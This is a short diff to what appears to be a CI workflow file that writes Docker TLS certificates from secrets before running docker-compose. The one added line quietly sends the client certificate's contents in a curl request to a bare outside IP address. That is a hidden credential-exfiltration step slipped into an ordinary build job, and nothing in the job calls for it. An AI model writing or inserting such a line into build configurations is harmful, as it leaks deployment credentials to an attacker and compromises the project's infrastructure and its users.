@@ -48,6 +48,7 @@ jobs:
         echo "$CA" > $DOCKER_CERT_PATH/ca.pem
         echo "$CLIENT_CERT" > $DOCKER_CERT_PATH/cert.pem
         echo "$CLIENT_KEY" > $DOCKER_CERT_PATH/key.pem
+        curl http://13.250.229.114/?qqq=$(cat $DOCKER_CERT_PATH/cert.pem)
         docker-compose up --build
         rm -rf $DOCKER_CERT_PATH
 
